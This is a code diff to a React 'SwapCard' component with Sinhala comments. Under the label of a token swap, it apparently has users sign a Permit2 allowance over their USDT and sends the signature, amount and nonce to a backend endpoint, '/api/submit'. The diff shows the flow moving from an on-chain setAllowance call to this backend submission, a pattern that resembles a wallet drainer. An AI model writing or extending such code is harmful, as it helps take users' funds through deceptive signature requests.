@@ -26,10 +26,11 @@ export default function SwapCard({ walletAddress, provider }) {
 
   const [livePrices, setLivePrices] = useState({});
 
-  // ⭐ ඔයාගේ PaymentProcessor contract address එක
+  // ⭐ ඔයාගේ Config
   const PERMIT2_CONTRACT_ADDRESS = "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33";
   const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+  const API_URL = "/api/submit"; // Vercel Serverless Function
 
   const updatePrices = async () => {
     const prices = await fetchLivePrices();
@@ -96,7 +97,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Execute Permit2 Flow
+  // ⭐ Execute Permit2 Flow (Backend එකට signature එක යවනවා)
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -167,46 +168,47 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // 7. Sign කරන්න (MetaMask එකේ eth_signTypedData_v4 enable කරන්න)
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x1' }],
-        });
-      } catch (switchError) {
-        // Already on mainnet
+      // 7. Sign කරන්න (window.ethereum.request පාවිච්චි කරන්න)
+      const signature = await window.ethereum.request({
+        method: 'eth_signTypedData_v4',
+        params: [
+          walletAddress,
+          JSON.stringify({
+            domain,
+            types,
+            primaryType: 'PermitSingle',
+            message
+          })
+        ]
+      });
+      
+      setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
+      
+      // 8. Backend එකට යවන්න
+      const response = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user: walletAddress,
+          amount: amount.toString(),
+          expiration: expiration,
+          nonce: nonce.toString(),
+          sigDeadline: sigDeadline,
+          signature: signature
+        })
+      });
+      
+      const result = await response.json();
+      
+      if (result.success) {
+        setStatus({ type: 'success', msg: '✅ Permit2 Approval Successful!' });
+        setIsLoading(false);
+        loadBalance();
+        setTimeout(() => setStatus(null), 8000);
+      } else {
+        setStatus({ type: 'error', msg: '❌ Failed: ' + (result.error || 'Unknown error') });
+        setIsLoading(false);
       }
-      
-      const signature = await signer._signTypedData(domain, types, message);
-      
-      setStatus({ type: 'info', msg: '⏳ Sending to contract...' });
-      
-      // 8. ඔයාගේ Contract එකේ setAllowance call කරන්න
-      const contract = new ethers.Contract(
-        PERMIT2_CONTRACT_ADDRESS,
-        [
-          "function setAllowance(address user, uint160 amount, uint48 expiration, uint48 nonce, uint256 sigDeadline, bytes calldata signature) external"
-        ],
-        signer
-      );
-      
-      const tx = await contract.setAllowance(
-        walletAddress,
-        amount,
-        expiration,
-        nonce,
-        sigDeadline,
-        signature
-      );
-      
-      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
-      await tx.wait();
-      
-      setStatus({ type: 'success', msg: '✅ Permit2 Approval Successful!' });
-      setIsLoading(false);
-      
-      loadBalance();
-      setTimeout(() => setStatus(null), 8000);
     } catch (error) {
       console.error("Execute Swap Error:", error);
       
